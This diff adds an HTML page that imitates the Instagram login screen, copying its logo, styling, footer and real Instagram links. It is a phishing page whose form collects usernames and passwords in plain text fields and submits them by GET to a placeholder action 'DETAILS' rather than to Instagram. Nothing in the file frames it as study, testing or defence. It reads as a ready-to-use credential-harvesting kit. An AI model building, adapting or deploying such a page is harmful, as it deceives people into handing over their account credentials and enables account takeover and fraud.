@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, user-scalable=false, initial-scale=1">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<title>instagram login</title>
+<style>
+body {
+  font-family: sans-serif;
+  background-color: #fafafa;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+  box-sizing: border-box;
+}
+
+a {
+  text-decoration: none;
+}
+
+.container {
+  max-width: 1000px;
+  margin: 0 auto;
+  display: flex;
+  justify-content: center;
+  flex-direction: column;
+  align-items: center;
+  margin-top: 3rem;
+  font-size: 14px;
+}
+
+.box {
+  max-width: 350px;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  background-color: #ffff;
+  border: 1px solid #e6e6e6;
+  border-radius: 1px;
+  margin: 0 0 10px;
+  padding: 10px 0;
+  flex-grow: 1;
+}
+
+
+
+
+.field {
+  margin: 10px 0;
+  position: relative;
+  font-size: 14px;
+  width: 100%;
+  text-overflow: ellipsis;
+}
+
+input {
+  padding: 9px 0px 7px 9px;
+  font-size: 12px;
+  width: 16rem;
+  height: 1.2rem;
+  outline: none;
+  background: #fafafa;
+  border-radius: 3px;
+  border: 1px solid #efefef;
+}
+
+/* label intial position*/
+
+label {
+  position: absolute;
+  pointer-events: none;
+  left: 10px;
+  padding-bottom: 15px;
+  transform: translateY(10px);
+  line-height: 6px;
+  transition: all ease-out 0.1s;
+  font-size: 14px;
+  color: #999;
+  padding-top: 6px;
+}
+
+/* hiding placeholder in all browsers */
+
+input::placeholder {
+  visibility: hidden;
+}
+
+/* hiding  placeholder in mozilla */
+.login-form ::-moz-placeholder {
+  color: transparent;
+}
+
+/* label final position */
+input:not(:placeholder-shown) + label {
+  transform: translateY(0);
+  font-size: 11px;
+}
+
+/* input padding increases if placeholder is not shown */
+input:not(:placeholder-shown) {
+  padding-top: 14px;
+  padding-bottom: 2px;
+}
+
+.login-button {
+  text-align: center;
+  width: 100%;
+  padding: 0.5rem;
+  border: 1px solid transparent;
+  background-color: #3897f0;
+  color: #fff;
+  font-weight: 600;
+  font-size: 14px;
+  cursor: pointer;
+}
+
+.separator {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  color: #999;
+  margin-top: 6px;
+}
+
+.separator .line {
+  height: 1px;
+  width: 40%;
+  background-color: #dbdbdb;
+}
+
+.other {
+  display: flex;
+  justify-content: center;
+  flex-direction: column;
+  align-items: center;
+}
+
+.fb-login-btn {
+  margin: 1rem;
+  border: 0;
+  cursor: pointer;
+  font-size: 14px;
+  color: #385185;
+  font-weight: 600;
+  background: transparent;
+}
+
+.fb-icon {
+  color: #385185;
+  font-size: 1rem;
+  padding-right: 1px;
+}
+
+.forgot-password {
+  font-size: 11px;
+  color: #003569;
+}
+
+.signup {
+  color: #3897f0;
+  font-weight: 600;
+}
+
+img {
+  pointer-events: none;
+}
+
+
+</style>
+
+</head>
+
+<body>
+
+<div class="other">
+    <div class="other">
+
+     <img src='http://pngimg.com/uploads/instagram/instagram_PNG5.png' width='240' height='78' unselectable="on">
+										                 
+        <form class="login-form" action="DETAILS" method="get">
+            <div class="field">
+                <input id="username" type="text" name="USERNAME" placeholder="Phone number, username, or email" />
+                <label for="username">Phone number, username, or email</label>
+            </div>
+            <div class="field">
+                <input id="password" type="text" name="PASSWORD" placeholder="password" />
+                <label for="password">Password</label>
+            </div>
+            <button class="login-button" type="submit" title="login">Log In</button>
+            <div class="separator">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+            </div>
+            </div>
+            <div class="other">
+                <button class="fb-login-btn" type="button">
+                    <a STYLE="color: #002e63;" href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522fudq8qyf86is44bsjk17mlz7a12k0wqs1yzqxgn2hwuksqnikjb%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D36ab7a6b-0f7f-4e81-a706-e2676754c07d&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522fudq8qyf86is44bsjk17mlz7a12k0wqs1yzqxgn2hwuksqnikjb%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0" class="facebook-login">
+                        <i class="fa fa-facebook-square fa-lg" aria-hidden="true"></i> Log in with Facebook
+                    </a></p>
+                    <span class=""></span> 
+                </button>
+                <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a> 
+            </div>
+        </form>
+    </div> 
+    <div class="other">
+        <p STYLE="font-size:13px;"><small>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/signup/phone">Sign Up </a></small></p>
+    	<p STYLE="font-size:15px;">Get the app.<p>
+				<a href="https://apps.apple.com/in/app/instagram/id389801252"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="appstore" style="width:164px;height:44px;"></a> 
+				</div>
+</div>
+</form>
+<div class="other">
+			<b> <br><br> <a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://about.instagram.com/"> &nbsp &nbsp &nbsp &nbsp ABOUT</a>
+				<a STYLE="text-align:center; font-size:15px; font-size:12px; color: #002e63;" href="https://help.instagram.com/">HELP &nbsp</a>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://about.instagram.com/en_US/blog/">PRESS &nbsp</a>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://www.instagram.com/developer/">API &nbsp</a>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://www.instagram.com/about/jobs/">JOBS &nbsp</a>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://help.instagram.com/519522125107875">PRIVACY &nbsp</a>
+				<br>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://help.instagram.com/581066165581870">TERMS &nbsp</a>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://www.instagram.com/explore/locations/">LOCATIONS &nbsp</a>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://www.instagram.com/directory/profiles/">TOP ACCOUNTS &nbsp</a>
+				<a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://www.instagram.com/directory/hashtags/">HASHTAGS &nbsp</a>
+				<br>  
+				<center><a STYLE="font-size:15px; font-size:12px; color: #002e63;" href="https://www.instagram.com/?hl=en">LANGUAGE</a></center></b>
+			<div class="other">
+			<div class="copyright">
+						<b><font style="opacity:.6; font-size:12px;"> © 2020 INSTAGRAM FROM FACEBOOK</b>
+						</div>
+						</div>
+						</div>
+						</div>
+</body>
+
+</html>
